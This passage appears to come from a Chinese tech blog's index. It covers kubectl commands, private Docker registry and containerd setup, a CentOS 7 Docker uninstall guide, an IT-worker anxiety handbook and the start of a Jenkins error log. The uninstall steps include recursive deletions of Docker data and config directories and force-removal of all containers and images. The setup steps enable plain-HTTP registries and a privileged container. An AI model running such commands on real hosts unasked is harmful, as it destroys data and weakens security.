bash)&quot; &gt;&gt; ~/.bashrcsource ~/.bashrc 8.5kubectl工具常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849查看帮助：kubectl -h查看可配置的资源对象：kubectl api-resources查看所有node信息：kubectl get node查看特定ns中的pod : kubectl get pod -n kube-system查看RC和service列表：kubectl get rc,svc显示Pod的详细信息：kubectl describe pod pod-name查看节点my-node的详细信息: kubectl describe nodes my-node 根据yaml创建资源：kubectl create -f pod.yaml 或 kubectl apply -f pod.yaml#apply 可以重复执行，create 不行基于pod.yaml定义的名称删除pod：kubectl delete -f pod.yaml 删除所有包含某个label的pod和service：kubectl delete pod,svc -l name=label-name删除所有Pod：kubectl delete pod --all查看endpoint列表：kubectl get endpoints执行pod的date命令：kubectl exec pod-name -- datekubectl exec pod-name -- bashkubectl exec pod-name -- ping 10.24.51.9获得pod中某个容器的TTY（相当于登录容器）：kubectl exec -it pod-name -c container-name -- bash#查看容器的日志kubectl logs pod-name#实时查看日志kubectl logs -f pod-name#若pod只有一个容器，可以不加-ckubectl log pod-name -c container_name查看注释：kubectl explain podkubectl explain pod.apiVersion查看节点labels：kubectl get node --show-labelkubectl创建pod实例：kubectl create deployment nginx --image=nginxkubectl get pod nginx-748c667d99-b542k --watch #查看容器启动状态kubectl get pod -n default -o widekubectl get deployments.appskubectl expose deployment nginx --port=80 --type=NodePortkubectl get pod,svc扩容多个副本 拉伸实例kubectl scale deployment nginx --replicas=2查看pods会看到两个nginx容器kubectl get pods如需修改端口为31000 可以使用edit选项直接指定。端口固定范围 --service-node-port-range=30000-50000。kubectl edit service nginx 8.6 registry私用仓库123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108docker创建本地局域网私有仓库:但有时候使用公共仓库可能不方便，这种情况下用户可以使用registry创建一个本地仓库供私人使用，使用私有仓库有许多优点：节省网络带宽，针对于每个镜像不用每个人都去中央仓库上面去下载，只需要从私有仓库中下载即可；提供镜像资源利用，针对于公司内部使用的镜像，推送到本地的私有仓库中，以供公司内部相关人员使用。目前Docker Registry已经升级到了v2，Registryv2使用Go语言编写，在性能和安全性上做了很多优化，重新设计了镜像的存储格式。如果需要安装registry v2，就需要下载registry:2.2的版本。Docker官方提供的工具docker-registry可以用于构建私有的镜像仓库docker pull registry #下载私有仓库镜像docker run -d -p 5000:5000 registry:latest #运行私有仓库容器映射端口号5000docker run -d --name=my_registry -p 5000:5000 -v /opt/data/registry:/tmp/registry docker.io/registry #指定本地仓库路径 这样有利于路径的归纳如下这将使用官方的 镜像来启动私有仓库。默认情况下，仓库会被创建在 容器的 目录下。你可以通过 -v 参数来将镜像文件存放在 本地的指定路径。例如下面的例子将上传的镜像放到本地的/opt/data/registry 目录docker run -d --name=my_registry -p 5000:5000 -v /opt/data/registry:/var/lib/registry docker.io/registry然后回到要上传的客户端主机给要上传的本地镜像&quot;test_nginx&quot;打标签为仓库ip地址/后面是上传仓库后的镜像名称(centos7-nginx)。如下所示：docker tag test_nginx 192.168.3.138:5000/centos7-nginxdocker push 192.168.3.138:5000/centos7-nginx #上载镜像docker pull 192.168.3.138:5000/centos7-nginx #下载镜像设置本地docker主机使用本地局域网http私有仓库,默认为httpsvi /etc/docker/daemon.json&#123;&quot;insecure-registries&quot;:[&quot;192.168.3.138:5000&quot;]&#125; 如下例所示：cat &gt; /etc/docker/daemon.json &lt;&lt; &#x27;EOF&#x27;&#123; &quot;graph&quot;:&quot;/docker&quot;, &quot;storage-driver&quot;: &quot;overlay2&quot;, &quot;insecure-registries&quot;:[&quot;192.168.3.25:5000&quot;], &quot;registry-mirrors&quot;: [ &quot;https://q2gr04ke.mirror.aliyuncs.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ], &quot;bip&quot;: &quot;172.17.0.1/16&quot;, &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;], &quot;live-restore&quot;: false, &quot;dns&quot; : [ &quot;114.114.114.114&quot;,&quot;8.8.8.8&quot; ]&#125;EOFcat &gt; /etc/docker/daemon.json &lt;&lt; &#x27;EOF&#x27;&#123; &quot;storage-driver&quot;: &quot;overlay2&quot;, &quot;insecure-registries&quot;:[&quot;192.168.3.153:5000&quot;], &quot;registry-mirrors&quot;: [ &quot;https://q2gr04ke.mirror.aliyuncs.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ], &quot;bip&quot;: &quot;172.17.0.1/16&quot;, &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;], &quot;live-restore&quot;: false, &quot;dns&quot; : [ &quot;114.114.114.114&quot;,&quot;8.8.8.8&quot; ]&#125;EOFsystemctl restart docker #重启docker服务使设置生效查看私有仓库镜像curl http://192.168.3.138:5000/v2/_catalogcurl -XGET http://192.168.3.138:5000/v2/centos7-nginx/tags/listdocker pull 192.168.3.153:5000/centos7-nginx2.11 安装registry-webdocker pull hyper/docker-registry-webdocker run -d -p 5001:8080 --name registry-web --link my_registry -e REGISTRY_URL=http://192.168.3.25:5000/v2 -e REGISTRY_NAME=192.168.3.25:5000 hyper/docker-registry-web命令注释docker run #运行-d #后台运行-p 5001:8080 #端口映射--name registry-web #容器命名--link registry #连接其他容器 加入registry到host-e REGISTRY_URL=http://registry:5000/v2 #指定仓库地址-e REGISTRY_NAME=localhost:5000 #仓库命名hyper/docker-registry-web #被启动的镜像curl http://127.0.0.1:5001镜像仓库的IP为192.168.3.153实例：docker run -d -p 5001:8080 --name registry-web --link my_registry -e REGISTRY_URL=http://192.168.3.153:5000/v2 -e REGISTRY_NAME=192.168.3.153:5000 hyper/docker-registry-web设置本地docker主机使用本地局域网http私有仓库,默认为httpsvim /etc/docker/daemon.json &#123; &quot;registry-mirrors&quot;: [&quot;https://4pefdwvq.mirror.aliyuncs.com&quot;], &quot;insecure-registries&quot;: [ &quot;192.168.3.25:5000&quot; ], &quot;storage-driver&quot;: &quot;overlay2&quot;, &quot;storage-opts&quot;: [ &quot;overlay2.override_kernel_check=true&quot; ]&#125;systemctl restart docker2.12 设置容器开机自启：docker run --restart=always --net=host --privileged=true -v /web:/usr/local/nginx/html/ -d b8ad90037e3a /bin/bash -c &#x27;/usr/local/nginx/sbin/nginx&#x27;注： --restart=always 实用容器开机自启restart的取值可以是以下3种情况：no - 容器退出时，不重启容器；on-failure - 只有在非0状态退出时才从新启动容器；always - 无论退出状态是如何，都重启容器； 8.7 containerd指向本地私有仓库 修改config.toml配置文件 第61行 指定国内镜像仓库 161 sandbox_image = &quot;registry.aliyuncs.com/google_containers/pause:3.6&quot; 114行区域可以指定http私库地址 如下所示 123456789144 [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry]145 config_path = &quot;&quot;146 147 [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.mirrors]148 [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.mirrors.&quot;docker.io&quot;]149 endpoint = [&quot;https://registry.cn-hangzhou.aliyuncs.com&quot;]150 [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.mirrors.&quot;192.168.31.252:5000&quot;]151 endpoint = [&quot;http://192.168.31.252:5000&quot;] 如下为完整config.toml实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249[root@master-01 ~]# cat config.toml disabled_plugins = []imports = []oom_score = 0plugin_dir = &quot;&quot;required_plugins = []root = &quot;/var/lib/containerd&quot;state = &quot;/run/containerd&quot;temp = &quot;&quot;version = 2[cgroup] path = &quot;&quot;[debug] address = &quot;&quot; format = &quot;&quot; gid = 0 level = &quot;&quot; uid = 0[grpc] address = &quot;/run/containerd/containerd.sock&quot; gid = 0 max_recv_message_size = 16777216 max_send_message_size = 16777216 tcp_address = &quot;&quot; tcp_tls_ca = &quot;&quot; tcp_tls_cert = &quot;&quot; tcp_tls_key = &quot;&quot; uid = 0[metrics] address = &quot;&quot; grpc_histogram = false[plugins] [plugins.&quot;io.containerd.gc.v1.scheduler&quot;] deletion_threshold = 0 mutation_threshold = 100 pause_threshold = 0.02 schedule_delay = &quot;0s&quot; startup_delay = &quot;100ms&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;] device_ownership_from_security_context = false disable_apparmor = false disable_cgroup = false disable_hugetlb_controller = true disable_proc_mount = false disable_tcp_service = true enable_selinux = false enable_tls_streaming = false enable_unprivileged_icmp = false enable_unprivileged_ports = false ignore_image_defined_volumes = false max_concurrent_downloads = 3 max_container_log_line_size = 16384 netns_mounts_under_state_dir = false restrict_oom_score_adj = false sandbox_image = &quot;registry.aliyuncs.com/google_containers/pause:3.6&quot; selinux_category_range = 1024 stats_collect_period = 10 stream_idle_timeout = &quot;4h0m0s&quot; stream_server_address = &quot;127.0.0.1&quot; stream_server_port = &quot;0&quot; systemd_cgroup = false tolerate_missing_hugetlb_controller = true unset_seccomp_profile = &quot;&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.cni] bin_dir = &quot;/opt/cni/bin&quot; conf_dir = &quot;/etc/cni/net.d&quot; conf_template = &quot;&quot; ip_pref = &quot;&quot; max_conf_num = 1 [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd] default_runtime_name = &quot;runc&quot; disable_snapshot_annotations = true discard_unpacked_layers = false ignore_rdt_not_enabled_errors = false no_pivot = false snapshotter = &quot;overlayfs&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.default_runtime] base_runtime_spec = &quot;&quot; cni_conf_dir = &quot;&quot; cni_max_conf_num = 0 container_annotations = [] pod_annotations = [] privileged_without_host_devices = false runtime_engine = &quot;&quot; runtime_path = &quot;&quot; runtime_root = &quot;&quot; runtime_type = &quot;&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.default_runtime.options] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc] base_runtime_spec = &quot;&quot; cni_conf_dir = &quot;&quot; cni_max_conf_num = 0 container_annotations = [] pod_annotations = [] privileged_without_host_devices = false runtime_engine = &quot;&quot; runtime_path = &quot;&quot; runtime_root = &quot;&quot; runtime_type = &quot;io.containerd.runc.v2&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc.options] BinaryName = &quot;&quot; CriuImagePath = &quot;&quot; CriuPath = &quot;&quot; CriuWorkPath = &quot;&quot; IoGid = 0 IoUid = 0 NoNewKeyring = false NoPivotRoot = false Root = &quot;&quot; ShimCgroup = &quot;&quot; SystemdCgroup = false [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.untrusted_workload_runtime] base_runtime_spec = &quot;&quot; cni_conf_dir = &quot;&quot; cni_max_conf_num = 0 container_annotations = [] pod_annotations = [] privileged_without_host_devices = false runtime_engine = &quot;&quot; runtime_path = &quot;&quot; runtime_root = &quot;&quot; runtime_type = &quot;&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.untrusted_workload_runtime.options] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.image_decryption] key_model = &quot;node&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry] config_path = &quot;&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.mirrors] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.mirrors.&quot;docker.io&quot;] endpoint = [&quot;https://registry.cn-hangzhou.aliyuncs.com&quot;] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.mirrors.&quot;192.168.31.252:5000&quot;] endpoint = [&quot;http://192.168.31.252:5000&quot;] [plugins.&quot;io.containerd.internal.v1.opt&quot;] path = &quot;/opt/containerd&quot; [plugins.&quot;io.containerd.internal.v1.restart&quot;] interval = &quot;10s&quot; [plugins.&quot;io.containerd.internal.v1.tracing&quot;] sampling_ratio = 1.0 service_name = &quot;containerd&quot; [plugins.&quot;io.containerd.metadata.v1.bolt&quot;] content_sharing_policy = &quot;shared&quot; [plugins.&quot;io.containerd.monitor.v1.cgroups&quot;] no_prometheus = false [plugins.&quot;io.containerd.runtime.v1.linux&quot;] no_shim = false runtime = &quot;runc&quot; runtime_root = &quot;&quot; shim = &quot;containerd-shim&quot; shim_debug = false [plugins.&quot;io.containerd.runtime.v2.task&quot;] platforms = [&quot;linux/amd64&quot;] sched_core = false [plugins.&quot;io.containerd.service.v1.diff-service&quot;] default = [&quot;walking&quot;] [plugins.&quot;io.containerd.service.v1.tasks-service&quot;] rdt_config_file = &quot;&quot; [plugins.&quot;io.containerd.snapshotter.v1.aufs&quot;] root_path = &quot;&quot; [plugins.&quot;io.containerd.snapshotter.v1.btrfs&quot;] root_path = &quot;&quot; [plugins.&quot;io.containerd.snapshotter.v1.devmapper&quot;] async_remove = false base_image_size = &quot;&quot; discard_blocks = false fs_options = &quot;&quot; fs_type = &quot;&quot; pool_name = &quot;&quot; root_path = &quot;&quot; [plugins.&quot;io.containerd.snapshotter.v1.native&quot;] root_path = &quot;&quot; [plugins.&quot;io.containerd.snapshotter.v1.overlayfs&quot;] mount_options = [] root_path = &quot;&quot; sync_remove = false upperdir_label = false [plugins.&quot;io.containerd.snapshotter.v1.zfs&quot;] root_path = &quot;&quot; [plugins.&quot;io.containerd.tracing.processor.v1.otlp&quot;] endpoint = &quot;192.168.31.252:5000&quot; insecure = true protocol = &quot;http&quot;[proxy_plugins][stream_processors] [stream_processors.&quot;io.containerd.ocicrypt.decoder.v1.tar&quot;] accepts = [&quot;application/vnd.oci.image.layer.v1.tar+encrypted&quot;] args = [&quot;--decryption-keys-path&quot;, &quot;/etc/containerd/ocicrypt/keys&quot;] env = [&quot;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&quot;] path = &quot;ctd-decoder&quot; returns = &quot;application/vnd.oci.image.layer.v1.tar&quot; [stream_processors.&quot;io.containerd.ocicrypt.decoder.v1.tar.gzip&quot;] accepts = [&quot;application/vnd.oci.image.layer.v1.tar+gzip+encrypted&quot;] args = [&quot;--decryption-keys-path&quot;, &quot;/etc/containerd/ocicrypt/keys&quot;] env = [&quot;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&quot;] path = &quot;ctd-decoder&quot; returns = &quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;[timeouts] &quot;io.containerd.timeout.bolt.open&quot; = &quot;0s&quot; &quot;io.containerd.timeout.shim.cleanup&quot; = &quot;5s&quot; &quot;io.containerd.timeout.shim.load&quot; = &quot;5s&quot; &quot;io.containerd.timeout.shim.shutdown&quot; = &quot;3s&quot; &quot;io.containerd.timeout.task.state&quot; = &quot;2s&quot;[ttrpc] address = &quot;&quot; gid = 0 uid = 0[root@master-01 ~]# 复制配置文件并重启containerd 1systemctl daemon-reload &amp;&amp; systemctl restart containerd","categories":[{"name":"K8s","slug":"K8s","permalink":"http://blog.ioimp.top/categories/K8s/"}],"tags":[{"name":"K8s基础学习","slug":"K8s基础学习","permalink":"http://blog.ioimp.top/tags/K8s%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"编程知识","slug":"编程知识","permalink":"http://blog.ioimp.top/tags/%E7%BC%96%E7%A8%8B%E7%9F%A5%E8%AF%86/"}]},{"title":"centos7 卸载docker","slug":"centos7-卸载docker","date":"2023-11-23T02:52:31.000Z","updated":"2023-11-23T02:55:27.513Z","comments":true,"path":"2023/11/23/centos7-卸载docker/","link":"","permalink":"http://blog.ioimp.top/2023/11/23/centos7-%E5%8D%B8%E8%BD%BDdocker/","excerpt":"","text":"centos7 卸载dockerCentOS 7下如何卸载Docker![CentOS 7下如何卸载Docker]( 本文介绍了在CentOS 7上如何卸载Docker。我们将使用命令行来完成这个过程。在开始之前，请确保您具有管理员权限。 1. 检查Docker安装情况在卸载Docker之前，首先我们需要检查系统中是否已经安装了Docker。可以使用以下命令来验证： 登录后复制 12docker version1. 如果您看到有关Docker的版本信息，则表示Docker已经安装在您的系统中。如果没有任何输出，说明您的系统中没有安装Docker。 2. 停止Docker服务在卸载Docker之前，我们需要停止正在运行的Docker服务。可以使用以下命令来停止Docker服务： 登录后复制 12sudo systemctl stop docker1. 3. 卸载Docker软件包现在我们可以开始卸载Docker软件包了。可以使用以下命令来卸载Docker： 登录后复制 12sudo yum remove docker1. 执行以上命令后，系统将提示您确认是否要卸载Docker软件包。输入y并按下回车键继续。 4. 删除Docker数据目录卸载Docker软件包后，还需要手动删除Docker的数据目录。可以使用以下命令来删除Docker数据目录： 登录后复制 12sudo rm -rf /var/lib/docker1. 5. 删除Docker镜像和容器卸载Docker后，您可能还需要删除已经下载的Docker镜像和容器。可以使用以下命令来删除所有Docker镜像和容器： 登录后复制 123docker rm -f $(docker ps -a -q)docker rmi -f $(docker images -a -q)1.2. 执行以上命令后，系统将删除所有已经停止的容器和所有的镜像。 6. 清理Docker残留配置有时候，即使卸载了Docker软件包，系统中仍然可能会有一些残留的配置文件。可以使用以下命令来清理Docker的残留配置： 登录后复制 123sudo rm -rf /etc/dockersudo rm -rf ~/.docker1.2. 结论在本文中，我们介绍了在CentOS 7上如何卸载Docker。通过使用命令行，您可以轻松地完成这个过程。请记住，在卸载Docker之前，一定要停止正在运行的Docker服务，并且备份您的重要数据。希望本文对您有所帮助！ 卸载Docker的过程","categories":[{"name":"疑难解答","slug":"疑难解答","permalink":"http://blog.ioimp.top/categories/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94/"}],"tags":[{"name":"文章收录","slug":"文章收录","permalink":"http://blog.ioimp.top/tags/%E6%96%87%E7%AB%A0%E6%94%B6%E5%BD%95/"},{"name":"拯救小白系列","slug":"拯救小白系列","permalink":"http://blog.ioimp.top/tags/%E6%8B%AF%E6%95%91%E5%B0%8F%E7%99%BD%E7%B3%BB%E5%88%97/"}]},{"title":"拯救小白焦虑手册","slug":"拯救小白焦虑手册","date":"2023-11-22T03:21:16.000Z","updated":"2023-11-22T03:21:52.873Z","comments":true,"path":"2023/11/22/拯救小白焦虑手册/","link":"","permalink":"http://blog.ioimp.top/2023/11/22/%E6%8B%AF%E6%95%91%E5%B0%8F%E7%99%BD%E7%84%A6%E8%99%91%E6%89%8B%E5%86%8C/","excerpt":"","text":"焦虑自救小册 最近有的读者找我咨询问题，聊下来我发现 IT 从业人员共有的突出问题就是焦虑。现在疫情、政策等大环境原因导致行业不稳定和生活艰难，焦虑是很多人的常态。 我也曾经焦虑过大概两年，这种状态刚开始自己还没意识到，直到出现了一些身体上很明显的症状才引起重视。后来经过一些自我调整我基本解决了这个问题，我之前写了篇文章分享自己的方法：35 岁，我用这三种方法克服焦虑 虽然相对前两年，我的焦虑感确实少了很多，但我并不认为已经一劳永逸地解决了这个问题，每个年龄段有不同的焦虑点，这似乎是一个一生需要关注的事情。我的这些方法虽然对自己有用，也不一定适合所有人，而且换城市、换工作的隐形成本是很大的。 我最近和学心理学的老同学聊了聊，顺便收集了一些工具、方法和书籍，总结出来供大家参考。 如果大家能一起来完善这个小手册就更好了，这文档共享在 Github：anxiety-handbook 自我测试SAS焦虑自评量表 - 健康心理测试 焦虑、压力、抑郁测试 关于测试： 正确对待测试，不要对结果恐慌。测试前做好心理建设，不管结果多遭，不要害怕它，想想自己参与测试的初衷是想让事情朝正确的方向发展。 将测试当作解决问题的工具。测试结果可以用来检测自己应对焦虑的情况：当焦虑变严重时，思考自己哪里没有做到位，不断改进克服它的方法；当焦虑减轻时，给自己一些奖励，让自己再放松一些。 认识焦虑焦虑多是由不确定引起的，是人类进化过程中保留下来的对外界的戒备。对于大部分人来说，焦虑是无法完全避免的，甚至适度的焦虑是能促使人进步。但是焦虑达到一定程度就会影响健康，特别是影响睡眠的时候情况更为糟糕。 焦虑患者常常对现实生活中的某些事情或将来的某些事情表现的过分担忧，有时患者也可以无明确目标的担忧。这种担心往往是与现实极不相称的，使患者感到非常的痛苦。还伴有自主神经亢进，肌肉紧张或跳动等自律神经失调 的症状。部分患者会自觉身体总是不舒服多次去医院看医生，又检查不出症状。但是对于患者来说，总会一直担心。 – 维基百科 就我个人体会，焦虑的时候会失眠、消化不良、精神紧张、心跳有时候感觉速度快。 产生原因认识到自己焦虑的原因是缓解焦虑的第一步，IT 从业人员的焦虑是很多是由国内的行业氛围、社会大环境导致的。 职场的 996 工作节奏、35 岁现象、末尾淘汰、职场 PUA 等等，这些让人没有足够的安全感。 另一部分原因是自我认知造成的，我们大多数人沿着社会预期的道路而行，并未想过自己想要什么样、适合什么样的生活。 这与教育和文化背景有关系，我们一直都存在一个较为单一的评价体系，在学校里面我们为了分数而竞争，毕业时我们为了一份的工作而竞争，职场上我们为了更好的绩效、更高的工资而竞争。竞争是我们的生活常态，而既然有竞争就会导致人有压力，日积月累形成焦虑。 而且，焦虑特别容易出现在对自己有要求的人群中，出现的年龄段也比较集中，焦虑大多出现在 25 ~ 40 左右，因为这个年龄段是职场的关键时期，也逐渐需要承担家庭的责任。 往往我们过了某些时间关口就会好一些，这个关口可能是认知和价值观上的改变，可能是学会了接纳自己，或者是学会了和焦虑相处。希望这个手册能帮你更快地闯过关口。 职场焦虑摆脱焦虑一个很重要的部分是认识自己所处的环境，识别出周围环境中的有害因素，这包括国内 IT 行业的两个常见问题： 内卷内卷会让人长期处于无意义的竞争状态，非常容易让人滋生焦虑。国内很多 IT 公司存在内卷的情况，这里有一个 IT 从业者维护的 996 公司列表你可以参考。以我的经验来说，对于大型 IT 公司，个人所处于的小组和部门可能更重要，直属 Leader 对你影响很大程度上决定了你在公司的工作感受： 996.ICU&#x2F;blacklist · 996icu&#x2F;996.ICU 如果你想改变内卷的环境，可以通过换组或者是换工作到 955 的公司，换城市、或者甚至去国外： 955.WLB 955 不加班的公司名单 996.Leave 逃离996 remote-jobs-cn 国内远程办公职位 职场 PUAPUA 全称 “Pick-up Artist”，起初指的是受过系统化学习实践精神控制者，让异性着迷的男女们，字面上的解释 PUA 指的是搭讪艺术家。 PUA 是一种诱骗和洗脑的技术，从而神不知鬼不觉的达到自己的目的，而且这是一种很难发现，非常隐晦的一种欺骗方式。 一些管理者并没有良好的管理能力，倒是学会了一些抓人的手法，所以职场 PUA 是很多 IT 人面临的困境。常见的职场 PUA 手法： 否定，不断批评和挑刺，有的时候会美其名曰鞭策你进步 打压，分配过多的任务，但是会告诉你在锻炼你 对比，拿你和别人对比，让你造成心理落差，或者怀疑自己的能力 怎么看领导是培养还是PUA我？ 当然还有很多手法，其实 PUA 的本质是让你觉得一切都是为了你好，从而让你不用怀疑地去执行任务。被 PUA 的人往往自身比较难以认识到，需要跳出来才能发现。 如果你的 Leader 让你太累，心理压力大，可以往这方面考虑一下自己是否在被 PUA。如果遭遇 PUA 解决办法就是换组或者换公司。 改变认知焦虑部分是因为认知局限所造成的，所谓庸人自扰。提升思维高度可以从根本上解决一些问题。思维和认知的高度往往也涉及到对人生中重要事项的看法和选择，这包括： 关于钱、工作的看法 是否待一线城市 是否结婚和要小孩 如何衡量成功 什么是幸福 对死亡的看法 个人的经历可能会改变认知，除此之外阅读、观影、思考、交谈也可能会改变认知。下面是我收集的一些相关书籍和纪录片。 书籍推荐解决焦虑问题类的书籍，往往被当作心灵鸡汤，鸡汤并没有不好，当你过于焦虑的时候，喝碗鸡汤有时候挺有用。另外一些哲学、历史方面的书也有用： 《当下的力量》 生活在过去使人忧愁，生活在未来使人焦虑，最好的状态是活在当下。 《象与骑象人》如何获取幸福，过有意义的生活 《人生的智慧》叔本华关于健康、财富、名声、荣誉、养生和待人接物所应遵守的原则等。非常推荐。 《沉思录》 《被讨厌的勇气》 《获得幸福的勇气》 《焦虑的人》 这是一本小说，情节跌宕起伏，故事温暖又治愈。 《精神焦虑症的自救》分为病例分析卷和访谈卷，包含对焦虑的全面介绍，还有大量摆脱焦虑情绪的技巧。 《焦虑是头大象，如何一口一口吃掉它》作者主张通过自我书写缓解焦虑，有书写的建议和方法，帮助人们辨别不同的焦虑状况如何用自我书写来缓解。 纪录片好的纪录片能让人了解个人生活之外的广袤世界、历史长河，意识到人类之渺小，从而改变认知： 蓝色星球 王朝 脸庞，村庄 河西走廊 人世间 徒手攀岩 哈佛大学公开课：幸福课 其他培养爱好培养爱好可以缓解部分焦虑，因为爱好让我们从日常工作生活中脱离出来。很多中年人都是通过爱好来缓解生活中的琐碎感。 运动、写作、钓鱼、摄影、乐高等，都是非常好的爱好。 日常技巧常对自己说这几个字： “无所谓”“没必要”“不至于” 冯唐分享过一个做法，如果你焦虑或者认为自己碰上了什么迈不过去的坎，找个医院去 ICU 门口待上一段时间。 心理咨询和行业相关的朋友咨询了一下，目前主流的心理治疗价目表: 新手 200-300 中级 500-800 专家 1000 以上 药物治疗常见药和副作用，待补充。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://blog.ioimp.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"文章收录","slug":"文章收录","permalink":"http://blog.ioimp.top/tags/%E6%96%87%E7%AB%A0%E6%94%B6%E5%BD%95/"},{"name":"拯救小白系列","slug":"拯救小白系列","permalink":"http://blog.ioimp.top/tags/%E6%8B%AF%E6%95%91%E5%B0%8F%E7%99%BD%E7%B3%BB%E5%88%97/"}]},{"title":"记一次jenkins构建失败的踩坑记录","slug":"记一次jenkins构建失败的踩坑记录","date":"2023-11-22T01:58:50.000Z","updated":"2023-11-22T01:59:17.770Z","comments":true,"path":"2023/11/22/记一次jenkins构建失败的踩坑记录/","link":"","permalink":"http://blog.ioimp.top/2023/11/22/%E8%AE%B0%E4%B8%80%E6%AC%A1jenkins%E6%9E%84%E5%BB%BA%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/","excerpt":"","text":"记一次jenkins构建失败的踩坑记录核心要旨:排错要一步一步排查,一步一步确认,确认问题失败在哪一步,而不是凭空猜测错误. 异常信息: 登录后复制 Started by user adminRunning as SYSTEMBuilding in workspace &#x2F;root&#x2F;.jenkins&#x2F;workspace&#x2F;app-serverusing credential 2c84e055-ab32-4bcb-9642-e490e1fb4443 &#x2F;usr&#x2F;bin&#x2F;git rev-parse –is-inside-work-tree # timeout&#x3D;10Fetching changes from the remote Git repository&#x2F;usr&#x2F;bin&#x2F;git config remote.origin.url https://gitee.com/kinome/aggregationServicePlatform.git # timeout&#x3D;10Using shallow fetch with depth 1Fetching upstream changes from https://gitee.com/kinome/aggregationServicePlatform.git&#x2F;usr&#x2F;bin&#x2F;git –version # timeout&#x3D;10using GIT_ASKPASS to set credentials&#x2F;usr&#x2F;bin&#x2F;git fetch –tags –progress –depth&#x3D;1 https://gitee.com/kinome/aggregationServicePlatform.git +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;* # timeout&#x3D;60&#x2F;usr&#x2F;bin&#x2F;git rev-parse refs&#x2F;remotes&#x2F;origin&#x2F;master^{commit} # timeout&#x3D;10&#x2F;usr&#x2F;bin&#x2F;git rev-parse refs&#x2F;remotes&#x2F;origin&#x2F;origin&#x2F;master^{commit} # timeout&#x3D;10Checking out Revision 0e92eabfe44ed70dcc240fcd7b714c2de2f0c7c6 (refs&#x2F;remotes&#x2F;origin&#x2F;master)&#x2F;usr&#x2F;bin&#x2F;git config core.sparsecheckout # timeout&#x3D;10&#x2F;usr&#x2F;bin&#x2F;git checkout -f 0e92eabfe44ed70dcc240fcd7b714c2de2f0c7c6 # timeout&#x3D;10Commit message: “commit”&#x2F;usr&#x2F;bin&#x2F;git rev-list –no-walk 0e92eabfe44ed70dcc240fcd7b714c2de2f0c7c6 # timeout&#x3D;10Parsing POMsEstablished TCP socket on 37780[app-server] $ &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64&#x2F;jre&#x2F;bin&#x2F;java -cp &#x2F;root&#x2F;.jenkins&#x2F;plugins&#x2F;maven-plugin&#x2F;WEB-INF&#x2F;lib&#x2F;maven3-agent-1.13.jar:&#x2F;usr&#x2F;share&#x2F;maven&#x2F;boot&#x2F;plexus-classworlds.jar org.jvnet.hudson.maven3.agent.Maven3Main &#x2F;usr&#x2F;share&#x2F;maven &#x2F;root&#x2F;.jenkins&#x2F;war&#x2F;WEB-INF&#x2F;lib&#x2F;remoting-4.2.jar &#x2F;root&#x2F;.jenkins&#x2F;plugins&#x2F;maven-plugin&#x2F;WEB-INF&#x2F;lib&#x2F;maven3-interceptor-1.13.jar &#x2F;root&#x2F;.jenkins&#x2F;plugins&#x2F;maven-plugin&#x2F;WEB-INF&#x2F;lib&#x2F;maven3-interceptor-commons-1.13.jar 37780ERROR: Failed to parse POMsjava.io.IOException: Cannot run program “&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64&#x2F;jre&#x2F;bin&#x2F;java” (in directory “&#x2F;root&#x2F;.jenkins&#x2F;workspace&#x2F;app-server”): error&#x3D;2, 没有那个文件或目录at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)at hudson.Proc$LocalProc.(Proc.java:252)at hudson.Proc$LocalProc.(Proc.java:221)at hudson.Launcher$LocalLauncher.launch(Launcher.java:936)at hudson.Launcher$ProcStarter.start(Launcher.java:454)at 